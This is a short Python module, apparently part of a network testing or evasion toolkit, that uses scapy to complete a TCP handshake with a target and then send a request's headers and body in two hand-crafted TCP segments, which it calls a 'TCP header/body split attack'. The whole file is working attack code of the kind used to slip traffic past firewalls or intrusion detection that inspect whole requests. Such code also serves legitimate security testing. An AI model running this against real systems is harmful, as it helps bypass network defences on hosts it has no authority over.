from scapy.all import *
from utils.tcp import tcp_handshake
from utils.payloads import get_split_headers

def run(target_ip, target_port):
    print("[*] Running TCP header/body split attack...")

    src_port = RandShort()
    ip = IP(dst=target_ip)

    seq, ack = tcp_handshake(target_ip, target_port, src_port)

    header, body = get_split_headers()

    pkt1 = TCP(sport=src_port, dport=target_port, flags='PA', seq=seq, ack=ack)
    pkt2 = TCP(sport=src_port, dport=target_port, flags='PA', seq=seq + len(header), ack=ack)

    send(ip/pkt1/header)
    send(ip/pkt2/body)
